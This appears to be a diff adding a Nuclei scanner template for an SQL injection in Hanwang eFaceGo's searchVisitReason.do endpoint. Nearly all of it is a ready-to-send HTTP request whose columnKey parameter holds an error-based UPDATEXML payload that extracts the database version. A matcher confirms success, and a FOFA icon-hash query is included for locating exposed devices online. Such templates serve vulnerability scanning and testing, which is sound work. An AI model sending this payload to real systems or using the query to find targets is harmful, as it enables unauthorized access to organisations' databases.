@@ -1,0 +1,34 @@
+id: hanwang-searchVisitReason-sqli
+info:
+  name: hanwang searchVisitReason.do - sqli
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - 
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: icon_hash="1380907357"
+    tips:
+    repair:
+    version:
+  tags: hanwang,efacego,sqli
+
+http:
+  - raw:
+      - |
+        GET /manage/visitorConfigManage/searchVisitReason.do?branchId=1&columnKey=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(2920=2920,1)))),8357))&deviceName=test&id=1&order=desc&page=1&pageSize=10&recoToken=SGUsqvF7cVS&type=1&start=2025-06-25&end=2025-06-25&groupId=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
+        Content-Length: 2
+
+    matchers:
+      - type: dsl
+        name: searchVisitReason.do
+        dsl:
+          - status_code == 200
+          - contains_all(body,'XPATH syntax error')
+        condition: and
+
